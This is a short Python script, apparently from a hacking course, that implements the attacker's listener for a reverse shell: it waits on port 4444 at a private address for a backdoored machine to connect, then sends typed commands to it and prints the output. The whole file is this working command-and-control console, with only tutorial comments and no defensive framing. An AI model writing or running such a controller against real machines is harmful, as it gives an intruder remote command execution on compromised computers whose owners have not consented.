import socket

class Listener:
    def __init__(self,ip, port ):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #modify an option so we can reuse sockets
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #bind socket to computer to listen for connections on port 4444
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        # returns 2 values - socket object that represents the option that we can use to send or receive data
        # 2nd object - address bound to the connection
        self.connection, address =  listener.accept()
        print("[+] Got a connection from" + str(address))

    def execute_remotely(self, command):
        self.connection.send(command.encode('utf-8'))
        # Receive and decode the result from bytes to string
        return self.connection.recv(1024).decode('utf-8')

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)

my_listener = Listener("192.168.0.35", 4444)
my_listener.run()
